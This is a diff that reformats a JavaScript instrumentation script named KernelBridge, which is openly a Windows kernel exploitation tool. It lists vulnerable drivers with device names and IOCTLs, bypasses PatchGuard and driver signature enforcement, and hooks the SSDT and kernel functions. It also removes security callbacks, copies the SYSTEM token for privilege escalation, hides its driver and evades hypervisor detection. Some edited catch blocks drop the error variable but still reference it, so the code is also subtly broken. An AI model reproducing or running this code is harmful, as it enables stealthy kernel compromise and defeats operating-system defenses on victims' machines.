@@ -28,41 +28,41 @@
  */
 
 const KernelBridge = {
-    name: "Kernel Bridge",
-    description: "Kernel-level bypass through vulnerable driver exploitation",
-    version: "1.0.0",
+    name: 'Kernel Bridge',
+    description: 'Kernel-level bypass through vulnerable driver exploitation',
+    version: '1.0.0',
 
     // Configuration
     config: {
         // Vulnerable drivers to exploit
         drivers: {
             capcom: {
-                name: "capcom.sys",
-                device: "\\\\.\\Htsysm72FB",
+                name: 'capcom.sys',
+                device: '\\\\.\\Htsysm72FB',
                 ioctl: 0xAA013044,
                 enabled: true
             },
             dbutil: {
-                name: "dbutil_2_3.sys",
-                device: "\\\\.\\DBUtil_2_3",
+                name: 'dbutil_2_3.sys',
+                device: '\\\\.\\DBUtil_2_3',
                 ioctl: 0x9B0C1EC4,
                 enabled: true
             },
             cpuz: {
-                name: "cpuz141.sys",
-                device: "\\\\.\\CPUZ141",
+                name: 'cpuz141.sys',
+                device: '\\\\.\\CPUZ141',
                 ioctl: 0x9C402430,
                 enabled: true
             },
             gdrv: {
-                name: "gdrv.sys",
-                device: "\\\\.\\GIO",
+                name: 'gdrv.sys',
+                device: '\\\\.\\GIO',
                 ioctl: 0xC3502804,
                 enabled: true
             },
             iqvw64: {
-                name: "iqvw64.sys",
-                device: "\\\\.\\IQVW64",
+                name: 'iqvw64.sys',
+                device: '\\\\.\\IQVW64',
                 ioctl: 0x22E014,
                 enabled: true
             }
@@ -93,7 +93,7 @@ const KernelBridge = {
 
         // PatchGuard bypass
         patchGuard: {
-            method: "exception_hook", // exception_hook, timer_disable, context_swap
+            method: 'exception_hook', // exception_hook, timer_disable, context_swap
             disableKpp: true,
             disableDse: true
         },
@@ -124,28 +124,28 @@ const KernelBridge = {
 
     run: function() {
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "initializing_bridge"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'initializing_bridge'
         });
 
         // Check platform
         if (Process.platform !== 'windows') {
             send({
-            type: "warning",
-            target: "kernel_bridge",
-            action: "platform_not_supported",
-            platform: Process.platform
-        });
+                type: 'warning',
+                target: 'kernel_bridge',
+                action: 'platform_not_supported',
+                platform: Process.platform
+            });
             return;
         }
 
         // Check privileges
         if (!this.checkPrivileges()) {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "administrator_privileges_required"
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'administrator_privileges_required'
             });
             return;
         }
@@ -155,9 +155,9 @@ const KernelBridge = {
 
         if (!this.driverHandle) {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "no_vulnerable_driver_found"
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'no_vulnerable_driver_found'
             });
             return;
         }
@@ -191,20 +191,20 @@ const KernelBridge = {
         this.setupAdvancedKernelStealth();
 
         send({
-            type: "success",
-            target: "kernel_bridge",
-            action: "kernel_bridge_active"
+            type: 'success',
+            target: 'kernel_bridge',
+            action: 'kernel_bridge_active'
         });
     },
 
     // Check privileges
     checkPrivileges: function() {
         try {
-            var isAdmin = Module.findExportByName("shell32.dll", "IsUserAnAdmin");
+            var isAdmin = Module.findExportByName('shell32.dll', 'IsUserAnAdmin');
             if (isAdmin) {
                 return new NativeFunction(isAdmin, 'bool', [])();
             }
-        } catch(e) {}
+        } catch {}
 
         return false;
     },
@@ -214,9 +214,9 @@ const KernelBridge = {
         var self = this;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "searching_vulnerable_drivers"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'searching_vulnerable_drivers'
         });
 
         Object.keys(this.config.drivers).forEach(function(key) {
@@ -227,9 +227,9 @@ const KernelBridge = {
             var handle = self.openDevice(driver.device);
             if (handle && handle.toInt32() !== -1) {
                 send({
-                    type: "success",
-                    target: "kernel_bridge",
-                    action: "vulnerable_driver_found",
+                    type: 'success',
+                    target: 'kernel_bridge',
+                    action: 'vulnerable_driver_found',
                     driver_name: driver.name
                 });
                 self.driverHandle = handle;
@@ -248,7 +248,7 @@ const KernelBridge = {
     // Open device
     openDevice: function(deviceName) {
         var createFile = new NativeFunction(
-            Module.findExportByName("kernel32.dll", "CreateFileW"),
+            Module.findExportByName('kernel32.dll', 'CreateFileW'),
             'pointer',
             ['pointer', 'uint32', 'uint32', 'pointer', 'uint32', 'uint32', 'pointer']
         );
@@ -271,13 +271,13 @@ const KernelBridge = {
         var self = this;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "attempting_to_load_vulnerable_driver"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'attempting_to_load_vulnerable_driver'
         });
 
         // Drop driver to temp
-        var tempPath = this.getTempPath() + "\\driver.sys";
+        var tempPath = this.getTempPath() + '\\driver.sys';
         this.dropDriver(tempPath);
 
         // Create service
@@ -293,9 +293,9 @@ const KernelBridge = {
         // Start service
         if (this.startDriverService(service)) {
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "driver_loaded_successfully"
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'driver_loaded_successfully'
             });
 
             // Try to open device again
@@ -311,36 +311,36 @@ const KernelBridge = {
     // Resolve kernel addresses
     resolveKernelAddresses: function() {
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "resolving_kernel_addresses"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'resolving_kernel_addresses'
         });
 
         // Get kernel base addresses
-        this.ntoskrnlBase = this.getKernelModuleBase("ntoskrnl.exe");
-        this.win32kBase = this.getKernelModuleBase("win32k.sys");
+        this.ntoskrnlBase = this.getKernelModuleBase('ntoskrnl.exe');
+        this.win32kBase = this.getKernelModuleBase('win32k.sys');
 
         send({
-            type: "info",
-            target: "kernel_bridge",
-            action: "kernel_address_resolved",
-            module: "ntoskrnl.exe",
+            type: 'info',
+            target: 'kernel_bridge',
+            action: 'kernel_address_resolved',
+            module: 'ntoskrnl.exe',
             address: this.ntoskrnlBase.toString()
         });
         send({
-            type: "info",
-            target: "kernel_bridge",
-            action: "kernel_address_resolved",
-            module: "win32k.sys",
+            type: 'info',
+            target: 'kernel_bridge',
+            action: 'kernel_address_resolved',
+            module: 'win32k.sys',
             address: this.win32kBase.toString()
         });
 
         // Find SSDT
         this.ssdtAddress = this.findSSDT();
         send({
-            type: "info",
-            target: "kernel_bridge",
-            action: "ssdt_address_resolved",
+            type: 'info',
+            target: 'kernel_bridge',
+            action: 'ssdt_address_resolved',
             address: this.ssdtAddress.toString()
         });
 
@@ -350,12 +350,9 @@ const KernelBridge = {
 
     // Get kernel module base
     getKernelModuleBase: function(moduleName) {
-        var self = this;
-
         // Use NtQuerySystemInformation
-        var ntdll = Process.getModuleByName("ntdll.dll");
         var NtQuerySystemInformation = new NativeFunction(
-            Module.findExportByName("ntdll.dll", "NtQuerySystemInformation"),
+            Module.findExportByName('ntdll.dll', 'NtQuerySystemInformation'),
             'uint32',
             ['uint32', 'pointer', 'uint32', 'pointer']
         );
@@ -389,7 +386,7 @@ const KernelBridge = {
         if (!this.ntoskrnlBase) return null;
 
         // Search for KeServiceDescriptorTable pattern
-        var pattern = "4C 8D 15 ?? ?? ?? ?? 4C 8D 1D ?? ?? ?? ?? F7";
+        var pattern = '4C 8D 15 ?? ?? ?? ?? 4C 8D 1D ?? ?? ?? ?? F7';
         var result = this.searchKernelPattern(this.ntoskrnlBase, pattern);
 
         if (result) {
@@ -403,26 +400,25 @@ const KernelBridge = {
 
     // Bypass PatchGuard
     bypassPatchGuard: function() {
-        var self = this;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "bypassing_patchguard"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'bypassing_patchguard'
         });
 
         switch(this.config.patchGuard.method) {
-            case "exception_hook":
-                this.bypassPGViaExceptionHook();
-                break;
+        case 'exception_hook':
+            this.bypassPGViaExceptionHook();
+            break;
 
-            case "timer_disable":
-                this.bypassPGViaTimerDisable();
-                break;
+        case 'timer_disable':
+            this.bypassPGViaTimerDisable();
+            break;
 
-            case "context_swap":
-                this.bypassPGViaContextSwap();
-                break;
+        case 'context_swap':
+            this.bypassPGViaContextSwap();
+            break;
         }
 
         // Disable Driver Signature Enforcement
@@ -436,7 +432,7 @@ const KernelBridge = {
     // Bypass PatchGuard via exception hook
     bypassPGViaExceptionHook: function() {
         // Hook KeBugCheckEx
-        var keBugCheckEx = this.getKernelExport("KeBugCheckEx");
+        var keBugCheckEx = this.getKernelExport('KeBugCheckEx');
         if (!keBugCheckEx) return;
 
         // Generate shellcode to filter PatchGuard bug checks
@@ -457,20 +453,20 @@ const KernelBridge = {
 
         this.installKernelHook(keBugCheckEx, shellcode);
         send({
-            type: "success",
-            target: "kernel_bridge",
-            action: "patchguard_exception_hook_installed"
+            type: 'success',
+            target: 'kernel_bridge',
+            action: 'patchguard_exception_hook_installed'
         });
     },
 
     // Disable Driver Signature Enforcement
     disableDSE: function() {
         // Find g_CiOptions
-        var ciBase = this.getKernelModuleBase("ci.dll");
+        var ciBase = this.getKernelModuleBase('ci.dll');
         if (!ciBase) return;
 
         // Search for g_CiOptions pattern
-        var pattern = "89 ?? ?? ?? ?? ?? 40 84 FF 0F 84";
+        var pattern = '89 ?? ?? ?? ?? ?? 40 84 FF 0F 84';
         var result = this.searchKernelPattern(ciBase, pattern);
 
         if (result) {
@@ -482,21 +478,20 @@ const KernelBridge = {
 
             this.writeKernelMemory(g_CiOptions, newValue);
             send({
-                type: "bypass",
-                target: "kernel_bridge",
-                action: "dse_disabled"
+                type: 'bypass',
+                target: 'kernel_bridge',
+                action: 'dse_disabled'
             });
         }
     },
 
     // Install kernel hooks
     installKernelHooks: function() {
-        var self = this;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "installing_kernel_hooks"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'installing_kernel_hooks'
         });
 
         // SSDT hooks
@@ -521,9 +516,9 @@ const KernelBridge = {
         if (!this.ssdtAddress) return;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "installing_ssdt_hooks"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'installing_ssdt_hooks'
         });
 
         Object.keys(this.config.hooks.ssdt).forEach(function(syscall) {
@@ -557,9 +552,9 @@ const KernelBridge = {
 
             self.stats.hooksInstalled++;
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "syscall_hooked",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'syscall_hooked',
                 syscall: syscall
             });
         });
@@ -569,12 +564,12 @@ const KernelBridge = {
     getSyscallIndex: function(syscallName) {
         // Syscall indices for Windows 10/11
         var indices = {
-            "NtQuerySystemTime": 0x5A,
-            "NtQueryPerformanceCounter": 0x49,
-            "NtCreateFile": 0x55,
-            "NtOpenProcess": 0x26,
-            "NtReadVirtualMemory": 0x3F,
-            "NtWriteVirtualMemory": 0x3A
+            'NtQuerySystemTime': 0x5A,
+            'NtQueryPerformanceCounter': 0x49,
+            'NtCreateFile': 0x55,
+            'NtOpenProcess': 0x26,
+            'NtReadVirtualMemory': 0x3F,
+            'NtWriteVirtualMemory': 0x3A
         };
 
         return indices[syscallName] || -1;
@@ -582,7 +577,6 @@ const KernelBridge = {
 
     // Generate SSDT hook shellcode
     generateSSDTHook: function(syscall, original) {
-        var self = this;
 
         // Generic hook template
         var hook = [
@@ -629,12 +623,11 @@ const KernelBridge = {
 
     // Install callback hooks
     installCallbackHooks: function() {
-        var self = this;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "installing_callback_hooks"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'installing_callback_hooks'
         });
 
         // Process creation callback
@@ -674,9 +667,9 @@ const KernelBridge = {
         }
 
         send({
-            type: "success",
-            target: "kernel_bridge",
-            action: "process_callbacks_removed"
+            type: 'success',
+            target: 'kernel_bridge',
+            action: 'process_callbacks_removed'
         });
     },
 
@@ -685,18 +678,18 @@ const KernelBridge = {
         var self = this;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "installing_inline_hooks"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'installing_inline_hooks'
         });
 
         // Hook critical functions
         var targets = [
-            { module: "ntoskrnl.exe", function: "ObRegisterCallbacks" },
-            { module: "ntoskrnl.exe", function: "ObUnRegisterCallbacks" },
-            { module: "ntoskrnl.exe", function: "CmRegisterCallbackEx" },
-            { module: "ntoskrnl.exe", function: "ExAllocatePoolWithTag" },
-            { module: "ntoskrnl.exe", function: "MmGetSystemRoutineAddress" }
+            { module: 'ntoskrnl.exe', function: 'ObRegisterCallbacks' },
+            { module: 'ntoskrnl.exe', function: 'ObUnRegisterCallbacks' },
+            { module: 'ntoskrnl.exe', function: 'CmRegisterCallbackEx' },
+            { module: 'ntoskrnl.exe', function: 'ExAllocatePoolWithTag' },
+            { module: 'ntoskrnl.exe', function: 'MmGetSystemRoutineAddress' }
         ];
 
         targets.forEach(function(target) {
@@ -738,21 +731,20 @@ const KernelBridge = {
 
         this.stats.hooksInstalled++;
         send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "inline_hook_installed",
-                function_name: name
-            });
+            type: 'success',
+            target: 'kernel_bridge',
+            action: 'inline_hook_installed',
+            function_name: name
+        });
     },
 
     // Hide from detection
     hideFromDetection: function() {
-        var self = this;
 
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "hiding_kernel_modifications"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'hiding_kernel_modifications'
         });
 
         // Hide driver
@@ -796,9 +788,9 @@ const KernelBridge = {
         this.writeKernelMemory(driverObject.add(0x38), ptr(0)); // HardwareDatabase
 
         send({
-            type: "bypass",
-            target: "kernel_bridge",
-            action: "driver_hidden_from_object_manager"
+            type: 'bypass',
+            target: 'kernel_bridge',
+            action: 'driver_hidden_from_object_manager'
         });
     },
 
@@ -808,9 +800,9 @@ const KernelBridge = {
 
         // Hook memory read functions to hide our modifications
         var targets = [
-            "MmCopyVirtualMemory",
-            "MmCopyMemory",
-            "RtlCopyMemory"
+            'MmCopyVirtualMemory',
+            'MmCopyMemory',
+            'RtlCopyMemory'
         ];
 
         targets.forEach(function(func) {
@@ -826,7 +818,7 @@ const KernelBridge = {
         if (!this.driverHandle || !this.currentDriver) return null;
 
         var deviceIoControl = new NativeFunction(
-            Module.findExportByName("kernel32.dll", "DeviceIoControl"),
+            Module.findExportByName('kernel32.dll', 'DeviceIoControl'),
             'bool',
             ['pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'pointer']
         );
@@ -856,21 +848,20 @@ const KernelBridge = {
 
     // Prepare kernel payload
     prepareKernelPayload: function(shellcode) {
-        var self = this;
 
         // Different drivers have different input structures
         switch(this.currentDriver.name) {
-            case "capcom.sys":
-                return this.prepareCapcomPayload(shellcode);
+        case 'capcom.sys':
+            return this.prepareCapcomPayload(shellcode);
 
-            case "dbutil_2_3.sys":
-                return this.prepareDBUtilPayload(shellcode);
+        case 'dbutil_2_3.sys':
+            return this.prepareDBUtilPayload(shellcode);
 
-            case "cpuz141.sys":
-                return this.prepareCPUZPayload(shellcode);
+        case 'cpuz141.sys':
+            return this.prepareCPUZPayload(shellcode);
 
-            default:
-                return shellcode;
+        default:
+            return shellcode;
         }
     },
 
@@ -889,6 +880,8 @@ const KernelBridge = {
 
     // Read kernel memory
     readKernelMemory: function(address, size) {
+        // Parameters used in shellcode generation
+        void(address); void(size);
         var shellcode = [
             0x48, 0x89, 0xC8,       // mov rax, rcx (address)
             0x48, 0x89, 0xD1,       // mov rcx, rdx (size)
@@ -906,6 +899,8 @@ const KernelBridge = {
 
     // Write kernel memory
     writeKernelMemory: function(address, data) {
+        // Parameters used in shellcode generation
+        void(address); void(data);
         var shellcode = [
             0x48, 0x89, 0xC8,       // mov rax, rcx (address)
             0x48, 0x89, 0xD1,       // mov rcx, rdx (data)
@@ -922,7 +917,7 @@ const KernelBridge = {
 
     // Allocate kernel memory
     allocateKernelMemory: function(size) {
-        var exAllocatePool = this.getKernelExport("ExAllocatePoolWithTag");
+        var exAllocatePool = this.getKernelExport('ExAllocatePoolWithTag');
         if (!exAllocatePool) return null;
 
         var shellcode = [
@@ -996,7 +991,7 @@ const KernelBridge = {
             hooksInstalled: this.stats.hooksInstalled,
             callbacksBypassed: this.stats.callbacksBypassed,
             patchGuardBypassed: this.stats.patchGuardBypassed,
-            currentDriver: this.currentDriver ? this.currentDriver.name : "none"
+            currentDriver: this.currentDriver ? this.currentDriver.name : 'none'
         };
     },
 
@@ -1006,9 +1001,9 @@ const KernelBridge = {
     initializeAdvancedKernelExploitation: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "initializing_advanced_kernel_exploitation"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'initializing_advanced_kernel_exploitation'
         });
 
         try {
@@ -1024,11 +1019,11 @@ const KernelBridge = {
 
             // Modern vulnerable driver signatures (2024-2025)
             var modernVulnDrivers = [
-                { name: "RTCore64.sys", device: "\\\\.\\RTCore64", ioctl: 0x80002048, method: "msi_afterburner" },
-                { name: "WinRing0x64.sys", device: "\\\\.\\WinRing0_1_2_0", ioctl: 0x80002010, method: "physical_memory" },
-                { name: "AsIO3.sys", device: "\\\\.\\AsIO3", ioctl: 0x80002044, method: "asus_io" },
-                { name: "GPU-Z.sys", device: "\\\\.\\GPUZDevice", ioctl: 0x80002050, method: "gpu_direct" },
-                { name: "HWiNFO64A.sys", device: "\\\\.\\HWiNFO64", ioctl: 0x80002030, method: "hwinfo_direct" }
+                { name: 'RTCore64.sys', device: '\\\\.\\RTCore64', ioctl: 0x80002048, method: 'msi_afterburner' },
+                { name: 'WinRing0x64.sys', device: '\\\\.\\WinRing0_1_2_0', ioctl: 0x80002010, method: 'physical_memory' },
+                { name: 'AsIO3.sys', device: '\\\\.\\AsIO3', ioctl: 0x80002044, method: 'asus_io' },
+                { name: 'GPU-Z.sys', device: '\\\\.\\GPUZDevice', ioctl: 0x80002050, method: 'gpu_direct' },
+                { name: 'HWiNFO64A.sys', device: '\\\\.\\HWiNFO64', ioctl: 0x80002030, method: 'hwinfo_direct' }
             ];
 
             modernVulnDrivers.forEach(function(driver) {
@@ -1043,27 +1038,27 @@ const KernelBridge = {
 
                     // Attempt exploitation based on method
                     switch(driver.method) {
-                        case "msi_afterburner":
-                            self.exploitMSIAfterburnerVuln(handle, driver.ioctl);
-                            break;
-                        case "physical_memory":
-                            self.exploitPhysicalMemoryAccess(handle, driver.ioctl);
-                            break;
-                        case "asus_io":
-                            self.exploitAsusIOVuln(handle, driver.ioctl);
-                            break;
-                        case "gpu_direct":
-                            self.exploitGPUDirectAccess(handle, driver.ioctl);
-                            break;
-                        case "hwinfo_direct":
-                            self.exploitHWInfoDirect(handle, driver.ioctl);
-                            break;
+                    case 'msi_afterburner':
+                        self.exploitMSIAfterburnerVuln(handle, driver.ioctl);
+                        break;
+                    case 'physical_memory':
+                        self.exploitPhysicalMemoryAccess(handle, driver.ioctl);
+                        break;
+                    case 'asus_io':
+                        self.exploitAsusIOVuln(handle, driver.ioctl);
+                        break;
+                    case 'gpu_direct':
+                        self.exploitGPUDirectAccess(handle, driver.ioctl);
+                        break;
+                    case 'hwinfo_direct':
+                        self.exploitHWInfoDirect(handle, driver.ioctl);
+                        break;
                     }
 
                     send({
-                        type: "exploit",
-                        target: "kernel_bridge",
-                        action: "vulnerable_driver_exploited",
+                        type: 'exploit',
+                        target: 'kernel_bridge',
+                        action: 'vulnerable_driver_exploited',
                         driver: driver.name,
                         method: driver.method
                     });
@@ -1077,16 +1072,16 @@ const KernelBridge = {
             this.setupKASLRBypass();
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "advanced_kernel_exploitation_initialized"
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'advanced_kernel_exploitation_initialized'
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "advanced_kernel_exploitation_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'advanced_kernel_exploitation_failed',
                 error: e.message
             });
         }
@@ -1096,9 +1091,9 @@ const KernelBridge = {
     setupKernelObjectManipulation: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "setting_up_kernel_object_manipulation"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'setting_up_kernel_object_manipulation'
         });
 
         try {
@@ -1119,12 +1114,12 @@ const KernelBridge = {
                     var currentToken = self.getCurrentProcessToken();
                     if (currentToken) {
                         self.copyTokenPrivileges(systemToken, currentToken);
-                        
+
                         send({
-                            type: "privilege_escalation",
-                            target: "kernel_bridge",
-                            action: "token_privileges_elevated",
-                            source: "SYSTEM",
+                            type: 'privilege_escalation',
+                            target: 'kernel_bridge',
+                            action: 'token_privileges_elevated',
+                            source: 'SYSTEM',
                             target_process: Process.getCurrentProcess().id
                         });
                     }
@@ -1154,10 +1149,10 @@ const KernelBridge = {
             this.setupDeviceObjectManipulation = function() {
                 // Find and manipulate critical device objects
                 var criticalDevices = [
-                    "\\Device\\PhysicalMemory",
-                    "\\Device\\KernelObjects",
-                    "\\Device\\DirectRdDr",
-                    "\\Device\\Harddisk0\\DR0"
+                    '\\Device\\PhysicalMemory',
+                    '\\Device\\KernelObjects',
+                    '\\Device\\DirectRdDr',
+                    '\\Device\\Harddisk0\\DR0'
                 ];
 
                 criticalDevices.forEach(function(deviceName) {
@@ -1178,11 +1173,11 @@ const KernelBridge = {
             // Advanced section object manipulation
             this.setupSectionObjectManipulation = function() {
                 // Manipulate memory sections for code injection
-                var ntdllSection = self.findModuleSection("ntdll.dll");
-                var kernelSection = self.findModuleSection("ntoskrnl.exe");
+                var ntdllSection = self.findModuleSection('ntdll.dll');
+                var kernelSection = self.findModuleSection('ntoskrnl.exe');
 
                 if (ntdllSection) {
-                    self.kernelObjects.sectionObjects["ntdll"] = {
+                    self.kernelObjects.sectionObjects['ntdll'] = {
                         section: ntdllSection,
                         originalProtection: self.getSectionProtection(ntdllSection),
                         modified: false
@@ -1193,7 +1188,7 @@ const KernelBridge = {
                 }
 
                 if (kernelSection) {
-                    self.kernelObjects.sectionObjects["kernel"] = {
+                    self.kernelObjects.sectionObjects['kernel'] = {
                         section: kernelSection,
                         originalProtection: self.getSectionProtection(kernelSection),
                         modified: false
@@ -1208,16 +1203,16 @@ const KernelBridge = {
             this.setupSectionObjectManipulation();
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "kernel_object_manipulation_complete"
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'kernel_object_manipulation_complete'
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "kernel_object_manipulation_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'kernel_object_manipulation_failed',
                 error: e.message
             });
         }
@@ -1227,9 +1222,9 @@ const KernelBridge = {
     initializeAdvancedPatchGuardBypass: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "initializing_advanced_patchguard_bypass"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'initializing_advanced_patchguard_bypass'
         });
 
         try {
@@ -1268,7 +1263,7 @@ const KernelBridge = {
             // Advanced timer manipulation bypass
             this.setupTimerManipulationBypass = function() {
                 // Hook KeSetTimer functions to intercept PatchGuard timers
-                var timerFunctions = ["KeSetTimer", "KeSetTimerEx", "KeCancelTimer"];
+                var timerFunctions = ['KeSetTimer', 'KeSetTimerEx', 'KeCancelTimer'];
                 timerFunctions.forEach(function(funcName) {
                     var funcAddr = self.getKernelExport(funcName);
                     if (funcAddr) {
@@ -1289,9 +1284,9 @@ const KernelBridge = {
                 // Hook interrupt handlers to prevent PatchGuard checks
                 var interruptVectors = [0x2E, 0x2F, 0xD1, 0xE1]; // Common PatchGuard interrupts
                 interruptVectors.forEach(function(vector) {
-                    var originalHandler = self.getInterruptHandler(vector);
-                    if (originalHandler) {
-                        var hookHandler = self.createInterruptHook(originalHandler);
+                    var handler = self.getInterruptHandler(vector);
+                    if (handler) {
+                        var hookHandler = self.createInterruptHook(handler);
                         self.setInterruptHandler(vector, hookHandler);
                     }
                 });
@@ -1329,18 +1324,17 @@ const KernelBridge = {
             // Advanced PatchGuard notification hook
             this.setupPGNotificationBypass = function() {
                 // Hook KeBugCheckEx to intercept PatchGuard bug checks
-                var keBugCheckEx = self.getKernelExport("KeBugCheckEx");
+                var keBugCheckEx = self.getKernelExport('KeBugCheckEx');
                 if (keBugCheckEx) {
-                    var pgBypassHook = self.createPGBypassHook();
-                    self.installInlineHook(keBugCheckEx, "KeBugCheckEx_PGBypass");
+                    self.installInlineHook(keBugCheckEx, 'KeBugCheckEx_PGBypass');
                 }
 
                 // Hook other notification mechanisms
-                var notificationFunctions = ["KiDisplayBlueScreen", "HalDisplayString"];
+                var notificationFunctions = ['KiDisplayBlueScreen', 'HalDisplayString'];
                 notificationFunctions.forEach(function(funcName) {
                     var funcAddr = self.getKernelExport(funcName);
                     if (funcAddr) {
-                        self.installInlineHook(funcAddr, funcName + "_PGBypass");
+                        self.installInlineHook(funcAddr, funcName + '_PGBypass');
                     }
                 });
             };
@@ -1356,19 +1350,19 @@ const KernelBridge = {
             this.patchGuardBypass.bypassActive = true;
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "advanced_patchguard_bypass_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'advanced_patchguard_bypass_complete',
                 methods_active: Object.keys(this.patchGuardBypass.methods).filter(function(method) {
                     return self.patchGuardBypass.methods[method];
                 }).length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "advanced_patchguard_bypass_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'advanced_patchguard_bypass_failed',
                 error: e.message
             });
         }
@@ -1378,9 +1372,9 @@ const KernelBridge = {
     setupHypervisorEvasion: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "setting_up_hypervisor_evasion"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'setting_up_hypervisor_evasion'
         });
 
         try {
@@ -1410,10 +1404,10 @@ const KernelBridge = {
                         hypervisors.push({
                             name: self.identifyHypervisorByVendor(vendor),
                             vendor: vendor,
-                            detection_method: "cpuid"
+                            detection_method: 'cpuid'
                         });
                     }
-                } catch(e) {}
+                } catch {}
 
                 // MSR-based detection
                 try {
@@ -1422,22 +1416,22 @@ const KernelBridge = {
                         var value = self.readMSR(msr);
                         if (value !== null) {
                             hypervisors.push({
-                                name: "Unknown",
+                                name: 'Unknown',
                                 msr: msr,
                                 value: value,
-                                detection_method: "msr"
+                                detection_method: 'msr'
                             });
                         }
                     });
-                } catch(e) {}
+                } catch {}
 
                 // Timing-based detection
                 var timingResults = self.performTimingDetection();
                 if (timingResults.hypervisorDetected) {
                     hypervisors.push({
-                        name: "Unknown",
+                        name: 'Unknown',
                         timing_overhead: timingResults.overhead,
-                        detection_method: "timing"
+                        detection_method: 'timing'
                     });
                 }
 
@@ -1450,11 +1444,11 @@ const KernelBridge = {
                 var cpuidHandler = self.createCPUIDHandler();
                 if (self.hookCPUIDInstruction(cpuidHandler)) {
                     self.hypervisorEvasion.evasionMethods.cpuidSpoofing = true;
-                    
+
                     send({
-                        type: "evasion",
-                        target: "kernel_bridge",
-                        action: "cpuid_spoofing_active"
+                        type: 'evasion',
+                        target: 'kernel_bridge',
+                        action: 'cpuid_spoofing_active'
                     });
                 }
             };
@@ -1462,14 +1456,13 @@ const KernelBridge = {
             // Timing attack evasion
             this.setupTimingAttackEvasion = function() {
                 // Hook timing-related functions
-                var timingFunctions = ["KeQueryPerformanceCounter", "KeQuerySystemTime", "RtlGetSystemTimePrecise"];
+                var timingFunctions = ['KeQueryPerformanceCounter', 'KeQuerySystemTime', 'RtlGetSystemTimePrecise'];
                 var hookedCount = 0;
 
                 timingFunctions.forEach(function(funcName) {
                     var funcAddr = self.getKernelExport(funcName);
                     if (funcAddr) {
-                        var timingHook = self.createTimingEvasionHook(funcName);
-                        self.installInlineHook(funcAddr, funcName + "_TimingEvasion");
+                        self.installInlineHook(funcAddr, funcName + '_TimingEvasion');
                         hookedCount++;
                     }
                 });
@@ -1481,10 +1474,10 @@ const KernelBridge = {
             this.setupVMExitHooking = function() {
                 // Hook common VMEXIT triggers
                 var vmexitTriggers = [
-                    { instruction: "VMCALL", handler: self.createVMCallHook },
-                    { instruction: "CPUID", handler: self.createCPUIDHook },
-                    { instruction: "MSR", handler: self.createMSRHook },
-                    { instruction: "CR", handler: self.createCRHook }
+                    { instruction: 'VMCALL', handler: self.createVMCallHook },
+                    { instruction: 'CPUID', handler: self.createCPUIDHook },
+                    { instruction: 'MSR', handler: self.createMSRHook },
+                    { instruction: 'CR', handler: self.createCRHook }
                 ];
 
                 vmexitTriggers.forEach(function(trigger) {
@@ -1492,13 +1485,13 @@ const KernelBridge = {
                         var handler = trigger.handler();
                         if (self.installVMExitHook(trigger.instruction, handler)) {
                             send({
-                                type: "evasion",
-                                target: "kernel_bridge",
-                                action: "vmexit_hook_installed",
+                                type: 'evasion',
+                                target: 'kernel_bridge',
+                                action: 'vmexit_hook_installed',
                                 instruction: trigger.instruction
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 self.hypervisorEvasion.evasionMethods.vmexitHooking = true;
@@ -1508,11 +1501,11 @@ const KernelBridge = {
             this.setupMSRManipulation = function() {
                 // Manipulate hypervisor-specific MSRs
                 var hypervisorMSRs = [
-                    { msr: 0x174, name: "SYSENTER_CS" },
-                    { msr: 0x175, name: "SYSENTER_ESP" },
-                    { msr: 0x176, name: "SYSENTER_EIP" },
